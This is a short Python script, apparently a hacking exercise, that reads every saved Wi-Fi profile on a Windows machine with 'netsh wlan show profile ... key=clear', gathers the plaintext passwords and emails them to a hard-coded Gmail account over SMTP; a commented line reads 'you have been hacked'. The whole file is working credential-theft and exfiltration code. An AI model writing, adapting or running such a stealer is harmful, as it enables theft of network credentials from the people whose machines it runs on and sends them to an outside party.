
# Subprocess allow us to run commands in the terminal, smtplib
import subprocess
import smtplib
import re

email = "email_account"  # os.environ.get("MAILACCOUNT")
passwd = "password_email_account"  # os.environ.get("MAILPWD")

# command = "msg * you have been hacked"
command = "netsh wlan show profile"

# Function that sends an email with information


def send_mail(email, password, message):
    """ This function allow me to send mails using the gmail server and my personal email to send information to my email

    Args:
        email (string): My email account that is going to send a receive the message
        password (String): The password of the mail account
        message (String): The output of the command prompt 
    """
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


if __name__ == '__main__':
    # store the output of the command that was run in the terminal
    networks = subprocess.check_output(command, shell=True)
    # Regex help us search the networks in the device
    network_names_list = re.findall(br"(?:Profile\s*:\s)(.*)", networks)

    # We iterate through the list of network names to find all the passwords
    result = ""
    for network_name in network_names_list:
        command = 'netsh wlan show profile ' + 'name=' + '"' + \
            network_name.decode('utf-8') + '"' + ' key=clear'
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result.decode('utf-8')

    # Finally we send the mail with the password of the wifi network
    send_mail(email, passwd, result)
    # Print message that the message was sent
    print("[+] Message was sent to your email address")
